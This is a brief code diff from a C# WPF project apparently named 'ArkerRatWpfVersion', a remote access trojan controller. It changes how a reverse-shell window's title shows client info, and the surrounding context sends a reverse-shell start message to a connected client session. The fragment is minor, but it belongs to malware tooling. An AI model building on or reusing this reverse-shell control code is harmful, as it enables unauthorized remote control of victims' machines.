@@ -28,7 +28,7 @@ namespace ArkerRatWpfVersion
             reverseShellTextOutput.Document.Blocks.Clear();
             reverseShellTextOutput.IsReadOnly = true;
             clientSession = session;
-            windowText.Content += " - " + (clientSession.clientInfo.Split('\t'))[0];
+            windowText.Content += " - " + clientSession.clientInfo[0];
             clientSession.reverseShellWindowIsAlreadyOpen = true;
             clientSession.SendData("§ReverseShellStart§§ReverseShellEnd§");
         }
